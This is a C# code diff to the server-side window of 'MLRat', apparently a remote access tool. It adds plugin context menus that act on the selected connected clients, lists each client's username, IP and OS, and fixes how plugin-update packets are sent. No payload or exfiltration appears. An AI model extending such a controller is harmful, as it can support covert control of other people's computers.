@@ -12,6 +12,7 @@ using System.Windows.Forms;
 using MLRat.Networking;
 using System.Diagnostics;
 using MLRat.Cryptography;
+using MLRat.Server;
 
 namespace MLRat.Forms
 {
@@ -61,12 +62,67 @@ namespace MLRat.Forms
                 pluginPanel.Controls.Add(_display);
                 LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                 Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
-                _plugin.ServerPlugin.OnPluginLoad();
+                _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd));
             }
             catch
             {
                 
             }
+        }
+
+        void OncontextAdd(MLPlugin _plugin, MLRatContextEntry entry)
+        {
+            ToolStripMenuItem _baseItem = new ToolStripMenuItem();
+            _baseItem.Text = entry.Text;
+            _baseItem.Tag = new MLContextData()
+            {
+                Plugin = _plugin,
+                ContextData = entry
+            };
+            _baseItem.Click += ContextMenu_Click;
+            if(entry.SubMenus != null)
+                AddMenuItem(_baseItem, entry);
+            ClientContextStrip.Items.Add(_baseItem);
+        }
+
+        void AddMenuItem(ToolStripMenuItem parent, MLRatContextEntry entry)
+        {
+            ToolStripMenuItem _menu = new ToolStripMenuItem();
+            _menu.Text = entry.Text;
+            _menu.Tag = entry;
+            _menu.Click += ContextMenu_Click;
+            foreach (var subentrys in entry.SubMenus)
+                AddMenuItem(_menu, subentrys);
+            parent.DropDownItems.Add(_menu);
+        }
+
+        void ContextMenu_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                ToolStripMenuItem _menu = (ToolStripMenuItem) sender;
+                MLContextData _entry = (MLContextData)_menu.Tag;
+
+                _entry.ContextData.OnClick(SelectedClients(_entry.Plugin));
+            }
+            catch
+            {
+                
+            }
+        }
+
+        IClient[] SelectedClients(MLPlugin _plugin)
+        {
+            List<IClient> _selectedClients = new List<IClient>();
+            foreach (ListViewItem i in clientList.SelectedItems)
+            {
+                this.Invoke((MethodInvoker) delegate()
+                {
+                    MLClientData _client = (MLClientData)i.Tag;
+                    _selectedClients.Add(new MLClient(_client.ID, _plugin.ClientPluginID, _client.ClientSocket));
+                });
+            }
+            return _selectedClients.ToArray();
         }
 
         private void MainWindow_Load(object sender, EventArgs e)
@@ -114,7 +170,13 @@ namespace MLRat.Forms
                             if (command == "handshake")
                             {
                                 string addUsername = (string) data[2];
+                                string OS = (string)data[3];
                                 ListViewItem i = new ListViewItem(addUsername);
+                                i.Tag = _ClientData;
+
+                                i.SubItems.Add(client.NetworkSocket.RemoteEndPoint.ToString());
+                                i.SubItems.Add(OS);
+
                                 _ClientData.DisplayObject = i;
                                 AddListview(i);
                                 _ClientData.Handshaken = true;
@@ -196,7 +258,9 @@ namespace MLRat.Forms
             {
                 while ((bytesRead = _pluginUpdate.Read(buffer, 0, buffer.Length)) > 0)
                 {
-                    client.Send(Guid.Empty, "pluginupdate", ID, buffer,
+                    byte[] Packet = new byte[bytesRead];
+                    Array.Copy(buffer, 0, Packet, 0, bytesRead);
+                    client.Send(Guid.Empty, "pluginupdate", ID, Packet,
                         _pluginUpdate.Position == _pluginUpdate.Length);
                 }
             }
@@ -235,7 +299,7 @@ namespace MLRat.Forms
 
         void NetworkServer_OnClientConnect(eSock.Server sender, eSock.Server.eSockClient client)
         {
-            MLClientData _ClientData = new MLClientData(GetUniqueID());
+            MLClientData _ClientData = new MLClientData(GetUniqueID(), client);
             client.Tag = _ClientData;
             foreach (var plugin in LoadedPlugins)
             {
